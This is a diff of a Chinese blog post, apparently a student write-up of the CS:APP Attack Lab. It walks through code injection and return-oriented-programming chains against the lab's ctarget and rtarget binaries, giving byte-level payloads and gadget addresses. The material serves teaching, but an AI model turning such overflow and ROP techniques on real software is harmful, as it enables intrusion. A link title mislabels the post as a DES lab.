 <p>下一步我们要修改<code>getbuf()</code>的返回地址，跳到我们的注入代码处，这样才能执行我们要做的事情，level2中我们已经得到它的返回地址是<code>0x5561dc78</code>。</p>
 <p>最后我们要在<code>test()</code>函数的栈帧中输入参数，也就是<code>35 39 62 39 39 37 66 61</code>。</p>
 <p>注意✍：经过实践，结尾添不添加<code>00</code>都可以，如果不添加是因为只有一个参数，占一个内存单元也就是64位，我们要输入的参数已经足够了；如果添加，和字符串以<code>00</code>结尾遥相呼应，也是对的。</p>
@@ -539,8 +554,102 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68	</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
 <p>然后执行：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; 3.txt | ./ctarget -q </span><br></pre></td></tr></table></figure>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/level3res.png" alt></p>
-<h3 id="Part2-Return-Oriented-Programming-ROP"><a href="#Part2-Return-Oriented-Programming-ROP" class="headerlink" title="Part2 Return-Oriented Programming(ROP)"></a>Part2 Return-Oriented Programming(ROP)</h3><h2 id="0x05-解决栈溢出"><a href="#0x05-解决栈溢出" class="headerlink" title="0x05.解决栈溢出"></a>0x05.解决栈溢出</h2><p>①栈金丝雀Canary</p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/level3res.png" style="zoom:60%;"></p>
+<h3 id="level2与level3实际应用"><a href="#level2与level3实际应用" class="headerlink" title="level2与level3实际应用"></a>level2与level3实际应用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In Phases 2 and 3,you caused a program to execute machine code of your own design. If CTARGET had been a network server,you could have injected your own code into a distant machine.</span><br></pre></td></tr></table></figure>
+<h3 id="Part2-Return-Oriented-Programming-ROP"><a href="#Part2-Return-Oriented-Programming-ROP" class="headerlink" title="Part2 Return-Oriented Programming(ROP)"></a>Part2 Return-Oriented Programming(ROP)</h3><p>随着 NX 保护的开启，以往直接向栈直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
+<ul>
+<li>程序存在溢出，并且可以控制返回地址。</li>
+<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
+</ul>
+<p>👋如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
+<p>下面开始实验：</p>
+<p>首先<code>checksec rtarget</code></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/chrt.png" style="zoom:80%;"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:程序架构信息,本机是amd64位程序</span><br><span class="line">RELRO:部分RELRO容易受到攻击</span><br><span class="line">Stack:栈溢出金丝雀保护</span><br><span class="line">NX:enabled表示开启NX保护,即栈中数据没有执行权限</span><br><span class="line">PIE(Position-Independent Executable，位置无关可执行文件):开启后，在编译时将程序编译为位置无关,程序运行时各个段（如代码但等）加载的虚拟地址也是在装载时才确定</span><br><span class="line">FORTIFY:由GCC实现的源码级别的保护机制，其功能是在编译的时候，检查源码以避免潜在的缓冲区溢出等错误。加了这个保护之后，一些敏感函数如read,fgets,memcpy,printf等等可能导致漏洞出现的函数会替换成__read_chk,__fgets_chk等。</span><br></pre></td></tr></table></figure>
+<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p>本次要做的是用ROP的思想重做level2，level4、5都开启了随机地址保护和NX保护，就无法通过代码注入实现，我们可以通过<code>pwndbg</code>来验证<code>rtarget</code>开启了随机地址保护而<code>ctarget</code>没有开启。</p>
+<p>首先是<code>ctarget</code>，我们运行2次，<code>STACK</code>处的值分别如下</p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/c001.png" style="zoom:65%;"></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/c002.png" style="zoom:65%;"></p>
+<p>可以看到没有变化，然后我们观察<code>rtarget</code></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/r001.png" style="zoom:90%;"></p>
+<p>此时<code>rsp = 0x7ffffffadbf0</code></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/r002.png" style="zoom:90%;"></p>
+<p>此时<code>rsp = 0x7ffffff98f18</code>，已成功验证开启了随机地址保护。</p>
+<p><strong>下面进入正题：</strong></p>
+<p>首先将<code>rtarget</code>反汇编为汇编语言：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d rtarget &gt; rtarget.txt</span><br></pre></td></tr></table></figure>
+<p>实验pdf中只能让我们在<code>start_farm</code>和<code>end_farm</code>二者之间选取可能使用的机器码，附录中给出了指令集对应的机器码：</p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/AAA.png" style="zoom:68%;"></p>
+<p>我们要做两件事：</p>
+<p>①将<code>cookie</code>作为函数唯一参数传入程序:$0x59b997fa$</p>
+<p>②程序执行完跳转到<code>touch2()</code>的地址:$0x4017ec$</p>
+<p>level2中我们传入参数是通过<code>mov %rax , %rdi</code>实现的，所以第一想法是在找到对应的机器码，即<code>48 89 c7</code>，确实能找到，然后我们查找是否有对应的<code>cookie</code>值，结果没有找到。</p>
+<p><strong>对于寄存器间的操作，能找到是正常的。但是对于数字间的赋值操作，找不到是正常的。</strong></p>
+<p>那么对于赋值我们换一种思路，看看指令集：发现<code>popq</code>正好满足我们的要求。</p>
+<p><code>popq</code>原理：将当前的<code>rsp</code>值赋值给某个寄存器，然后<code>rsp+0x08</code>。</p>
+<p>所以我们可以将<code>cookie</code>注入栈中，<code>popq</code>给某个寄存器，然后再将寄存器<code>mov</code>到<code>%rdi</code>中。</p>
+<p><code>0x4019ab</code>有一个gadget，且<code>58</code>是<code>popq %rax</code>，<code>90</code>是<code>nop</code>占位指令，恰好满足我们的要求。</p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/popq01.png" style="zoom:60%;"></p>
+<p><code>mov %rax,%rdi</code>对应的机器码是：<code>48 89 c7</code>，查找一下：</p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/4889c7.png" style="zoom:60%;"></p>
+<p>对应内存地址是$0x4019a2$</p>
+<p>所以我们要构造的栈结构如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">||_____touch2_____|&lt;==%rsp+<span class="number">0x18</span></span><br><span class="line">||_mov %rax,%rdi__|&lt;==%rsp+<span class="number">0x10</span></span><br><span class="line">||__cookie-value__|&lt;==%rsp+<span class="number">8</span>,getbuf-rbp(返回地址)</span><br><span class="line">||____popq %rax___|&lt;==%rsp</span><br><span class="line">V|________________|</span><br></pre></td></tr></table></figure>
+<p><code>gedit 4.txt</code>并输入保存以下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00 </span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; 4.txt | ./rtarget -q</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/l4res.png" style="zoom:60%;"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code.</span><br></pre></td></tr></table></figure>
+<h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><p>实验的pdf描述如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.</span><br><span class="line">Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</span><br></pre></td></tr></table></figure>
+<h5 id="前置知识-x86中的lea指令及其变种"><a href="#前置知识-x86中的lea指令及其变种" class="headerlink" title="前置知识:x86中的lea指令及其变种"></a>前置知识:x86中的lea指令及其变种</h5><p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/lea.png" alt></p>
+<p>再贴一个$stackoverflow$上的高赞解释：</p>
+<p>As others have pointed out, <code>LEA (load effective address)</code> is often used as a “trick” to do certain computations, but that’s not its primary purpose. The x86 instruction set was designed to support high-level languages like Pascal and C, where arrays—especially arrays of ints or small structs—are common. Consider, for example, a struct representing (x, y) coordinates:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct Point</span><br><span class="line">&#123;</span><br><span class="line">     int xcoord;</span><br><span class="line">     int ycoord;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>Now imagine a statement like:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int y = points[i].ycoord;</span><br></pre></td></tr></table></figure>
+<p>where <code>points[]</code> is an array of Point. Assuming the base of the array is already in <code>EBX</code>, and variable i is in <code>EAX</code>, and xcoord and ycoord are each 32 bits (so ycoord is at offset 4 bytes in the struct), this statement can be compiled to:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV EDX, [EBX + 8*EAX + 4]     </span><br></pre></td></tr></table></figure>
+<p>right side is “effective address”, which will land y in <code>EDX</code>. The scale factor of 8 is because each Point is 8 bytes in size. Now consider the same expression used with the “address of” operator &amp;:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int *p = &amp;points[i].ycoord;</span><br></pre></td></tr></table></figure>
+<p>In this case, you don’t want the value of ycoord, but its address. That’s where <code>LEA</code> (load effective address) comes in. Instead of a MOV, the compiler can generate</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEA ESI, [EBX + 8*EAX + 4]</span><br></pre></td></tr></table></figure>
+<p>which will load the address in ESI.</p>
+<p><strong>变种（本实验遇到）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leaw ;2个字节</span><br><span class="line">leal ;4个字节</span><br><span class="line">leaq ;8个字节</span><br></pre></td></tr></table></figure>
+<p>具体用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leaq a(b,c,d) , %rax</span><br><span class="line">&lt;==&gt;</span><br><span class="line">%rax = a+b+c*d</span><br></pre></td></tr></table></figure>
+<p>lea指令是x86体系结构中，是一条最古老但是从某个方面来讲又是最神奇的指令。</p>
+<p>表面上看，它做的事情非常简单，根据括号里的源操作数来计算地址，然后把地址加载到目标寄存器中。实际上<code>leaq</code>不引用源操作数里的寄存器，只是单纯计算，完全可以当作乘法来用。</p>
+<p>eg1: <code>rbx * 2</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $8 , %rbx</span><br><span class="line">leaq (,rbx,2) , %rax</span><br></pre></td></tr></table></figure>
+<p>eg2:<code>rbx * 3 - 1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $2 , %rbx</span><br><span class="line">leaq -1(%rbx,%rbx,2) , %rax</span><br></pre></td></tr></table></figure>
+<p>✍下面开始分析本次实验：</p>
+<p>首先，注入字符串是9个机器码，以<code>00</code>结尾。</p>
+<p>在level3中我们是通过跳转到确定的栈顶<code>%rsp</code>地址来执行code的，但是在本次实验中开启了随机化，所以无法注入代码，只能<code>ROP</code>。一个很好的思路是通过<strong>栈顶+偏移地址</strong>来计算。先获取到栈顶的位置，然后加上我们放置距离栈顶的相对位置，得到<code>cookie</code>字符串起始地址放置的位置。</p>
+<p>最开始想找到直接传入<code>mov %rax , %rdi</code>的机器码<code>48 89 e0</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:       c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:       c3                      retq</span><br></pre></td></tr></table></figure>
+<p>通过观察代码，学了一下<code>lea</code>指令的原理，在前面写过了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq</span><br></pre></td></tr></table></figure>
+<p><strong>更要注意的是</strong>：<code>04 37</code>是<code>add $0x37,%al</code>，可以表示将传入的字符串存在距离栈顶<code>0x37</code>字节处。</p>
+<p>所以我们可以构造这样的一个攻击链：</p>
+<p>先填充40字节破坏栈，然后<code>mov %rsp,%rax</code>，将栈顶移入<code>%rax</code>中，这段代码的内存位置是<code>0x4019d8</code>；然后我们<code>add $0x37,%al</code>，给<code>%rax</code>加上<code>0x37</code>，这段代码内存位置是<code>0x4019d8</code>；下一步就是将<code>%rax</code>值传入<code>%rdi</code>，代码内存位置是<code>0x4019a2</code>，然后跳转到<code>touch3</code>函数，地址是<code>0x4018fa</code>；最后我们传入字符串<strong>并且在字符串前面填充字节使得这个字符串的地址和保存的栈顶地址相差55个字节</strong>，此时<code>%rsp</code>指向<code>ad 1a 40 00 00 00 00 00</code>这个内存单元，距离字符串首地址有$55-3\times8 =  31$个字节，所以<strong>可能</strong>的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">d8 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">33 33 33 33 33 33 33 33 33 33</span><br><span class="line">33 33 33 33 33 33 33 33 33 33</span><br><span class="line">33 33 33 33 33 33 33 33 33 33</span><br><span class="line">33 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/l5res.png" style="zoom:100%;"></p>
+<h2 id="0x05-实验感想"><a href="#0x05-实验感想" class="headerlink" title="0x05.实验感想"></a>0x05.实验感想</h2><p>通过完成CMU的CS:APP的lab3，我对Linux系统相关技术、内存管理、函数调用与栈、栈保护机制、代码注入、ROP等计算机底层安全知识有了更深入的了解和掌握，也精进了<code>pwndbg,checksec</code>等安全工具的使用，认识到了要多向国外计算机顶尖强校学习；</p>
+<p>这次实验同时启发了我，以后在编写代码时不仅要考虑实用性，还要考虑底层安全性与合理性，这些都极大地激发了我对二进制漏洞等安全知识和对计算机系统的学习兴趣。</p>
+<h2 id="0x06-参考文献与资料"><a href="#0x06-参考文献与资料" class="headerlink" title="0x06.参考文献与资料"></a>0x06.参考文献与资料</h2><p>1.《深入理解计算机系统第三版》（美）布赖恩特（Bryant,R.E.） 等 机械工业出版社</p>
+<p>2.《微型计算机原理及其技术接口第三版》裘雪红 车向泉等 西安电子科技大学出版社</p>
+<p>3.《C专家编程》（美）林登（LinDen,P.V.D）人民邮电出版社</p>
+<p>4.<a target="_blank" rel="noopener" href="https://ctf-wiki.org/">CTF-WIKI</a></p>
+<p>5.<a target="_blank" rel="noopener" href="https://sworduo.github.io/">Sworduo’s Blog</a></p>
+<p>6.<a target="_blank" rel="noopener" href="https://www.aldeid.com/wiki/X86-assembly/Instructions/lea">Aldeid.com</a></p>
+<p>7.<a target="_blank" rel="noopener" href="https://www.cnblogs.com/YangARTuan/p/11628591.html">汇编指令：lea</a></p>
+<p>8.<a target="_blank" rel="noopener" href="https://www.runoob.com/cprogramming/c-function-gets.html">C库函数-gets()</a></p>
+<p>9.<a target="_blank" rel="noopener" href="https://github.com/Exely/CSAPP-Labs">GithubRepo</a></p>
+<h2 id="0x07-后记"><a href="#0x07-后记" class="headerlink" title="0x07.后记"></a>0x07.后记</h2><p>本篇实验报告已经同步到个人学术博客上:<a href="http://nexuslbh.top/">http://nexuslbh.top/</a></p>
 
     </div>
 
@@ -581,7 +690,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">http://nexuslbh.top/2022/10/04/栈溢出/</a>
+    <a href="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="DES算法实现——Lab">http://nexuslbh.top/2022/10/13/栈溢出/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -676,7 +785,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BB%8E%E6%A0%88%E4%B8%8E%E5%86%85%E5%AD%98%E8%B0%88%E8%B5%B7"><span class="nav-number">1.</span> <span class="nav-text">0x01.从栈与内存谈起</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%AE%B2%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">2.</span> <span class="nav-text">0x02.为什么要讲栈溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%B6%89%E5%8F%8A%E5%BA%95%E5%B1%82%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">0x03.涉及底层与应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">3.1.</span> <span class="nav-text">（1）寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89GDB%E4%B8%8EPWNDBG"><span class="nav-number">3.2.</span> <span class="nav-text">（2）GDB与PWNDBG</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GDB%E5%AE%89%E8%A3%85"><span class="nav-number">3.2.1.</span> <span class="nav-text">GDB安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PWNDBG%E5%AE%89%E8%A3%85"><span class="nav-number">3.2.2.</span> <span class="nav-text">PWNDBG安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PWNDBG%E4%BD%BF%E7%94%A8"><span class="nav-number">3.2.3.</span> <span class="nav-text">PWNDBG使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="nav-number">3.3.</span> <span class="nav-text">（3）函数调用约定</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">3.4.</span> <span class="nav-text">（4）函数调用栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%885%EF%BC%89gets-%E5%87%BD%E6%95%B0"><span class="nav-number">3.5.</span> <span class="nav-text">（5）gets()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%886%EF%BC%89x86%E4%B8%8Ex86-64%E5%8C%BA%E5%88%AB"><span class="nav-number">3.6.</span> <span class="nav-text">（6）x86与x86_64区别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C"><span class="nav-number">4.</span> <span class="nav-text">0x04.栈溢出实验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E4%B8%8E%E6%A6%82%E8%BF%B0"><span class="nav-number">4.1.</span> <span class="nav-text">实验环境与概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Target-Programs"><span class="nav-number">4.2.</span> <span class="nav-text">Target Programs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ctarget-and-Rtarget%E6%89%A7%E8%A1%8C%E5%8F%82%E6%95%B0"><span class="nav-number">4.3.</span> <span class="nav-text">Ctarget and Rtarget执行参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Part1-Code-Injection"><span class="nav-number">4.4.</span> <span class="nav-text">Part1 Code Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#level1"><span class="nav-number">4.4.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level2"><span class="nav-number">4.4.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-level3"><span class="nav-number">4.4.3.</span> <span class="nav-text">3.level3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Part2-Return-Oriented-Programming-ROP"><span class="nav-number">4.5.</span> <span class="nav-text">Part2 Return-Oriented Programming(ROP)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E8%A7%A3%E5%86%B3%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">5.</span> <span class="nav-text">0x05.解决栈溢出</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">1.</span> <span class="nav-text">栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BB%8E%E6%A0%88%E4%B8%8E%E5%86%85%E5%AD%98%E8%B0%88%E8%B5%B7"><span class="nav-number">1.1.</span> <span class="nav-text">0x01.从栈与内存谈起</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%AE%B2%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">1.2.</span> <span class="nav-text">0x02.为什么要讲栈溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%B6%89%E5%8F%8A%E5%BA%95%E5%B1%82%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">0x03.涉及底层与应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.3.1.</span> <span class="nav-text">（1）寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89GDB%E3%80%81PWNDBG%E3%80%81Checksec"><span class="nav-number">1.3.2.</span> <span class="nav-text">（2）GDB、PWNDBG、Checksec</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GDB%E5%AE%89%E8%A3%85"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">GDB安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PWNDBG%E5%AE%89%E8%A3%85"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">PWNDBG安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PWNDBG%E4%BD%BF%E7%94%A8"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">PWNDBG使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Checksec%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">Checksec安装与使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="nav-number">1.3.3.</span> <span class="nav-text">（3）函数调用约定</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">1.3.4.</span> <span class="nav-text">（4）函数调用栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%885%EF%BC%89gets-%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.5.</span> <span class="nav-text">（5）gets()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%886%EF%BC%89x86%E4%B8%8Ex86-64%E5%8C%BA%E5%88%AB"><span class="nav-number">1.3.6.</span> <span class="nav-text">（6）x86与x86_64区别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C"><span class="nav-number">1.4.</span> <span class="nav-text">0x04.栈溢出实验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E4%B8%8E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.4.1.</span> <span class="nav-text">实验环境与概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Target-Programs"><span class="nav-number">1.4.2.</span> <span class="nav-text">Target Programs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ctarget-and-Rtarget%E6%89%A7%E8%A1%8C%E5%8F%82%E6%95%B0"><span class="nav-number">1.4.3.</span> <span class="nav-text">Ctarget and Rtarget执行参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Part1-Code-Injection"><span class="nav-number">1.4.4.</span> <span class="nav-text">Part1 Code Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 